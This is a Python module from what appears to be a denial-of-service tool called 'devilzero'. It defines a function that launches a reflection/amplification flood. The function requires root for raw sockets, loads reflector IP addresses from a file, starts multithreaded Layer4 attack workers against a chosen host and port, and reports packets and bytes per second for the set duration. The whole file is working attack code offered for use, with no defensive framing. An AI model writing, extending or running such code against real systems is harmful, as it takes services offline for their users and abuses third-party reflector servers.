import socket
import time
from threading import Event, Thread
from pathlib import Path
from typing import Set, List
from itertools import cycle

from .core import Tools, REQUESTS_SENT, BYTES_SEND, LOCAL_IP
from .layer4 import Layer4
from .utils import Colors, is_root, print_error, print_warning, print_success

def amplification_attack(host: str, port: int, method: str, threads: int, duration: int, reflector_file: str):
    """
    Run an amplification attack using reflectors.
    """
    if not is_root():
        print_error("Amplification attacks require root privileges (raw sockets).")
        print_warning("Please run with sudo: sudo devilzero")
        return

    # Resolve host
    try:
        host_ip = socket.gethostbyname(host)
    except Exception as e:
        print_error(f"Cannot resolve host: {e}")
        return

    # Check raw socket capability
    if not _check_raw_socket():
        print_error("Raw socket creation failed. This attack requires root privileges.")
        return

    # Load reflectors
    ref_path = Path(reflector_file)
    if not ref_path.exists():
        print_error(f"Reflector file not found: {reflector_file}")
        return

    with open(ref_path, 'r') as f:
        content = f.read()
        ref = set(Tools.IP.findall(content))
    if not ref:
        print_error("No valid IP addresses found in reflector file.")
        return

    print_success(f"Loaded {len(ref)} reflectors.")

    event = Event()
    event.clear()
    for _ in range(threads):
        Layer4((host_ip, port), list(ref), method, event, None).start()

    print_success(f"Amplification attack started on {host}:{port} with method {method} for {duration} seconds.")
    event.set()
    start_time = time.time()
    while time.time() < start_time + duration:
        print(f"\r{Colors.WARNING}PPS: {Tools.humanformat(int(REQUESTS_SENT))}  BPS: {Tools.humanbytes(int(BYTES_SEND))}{Colors.RESET}", end='')
        REQUESTS_SENT.set(0)
        BYTES_SEND.set(0)
        time.sleep(1)
    event.clear()
    print_success("Attack stopped.")

def _check_raw_socket() -> bool:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.close()
        return True
    except Exception:
        return False
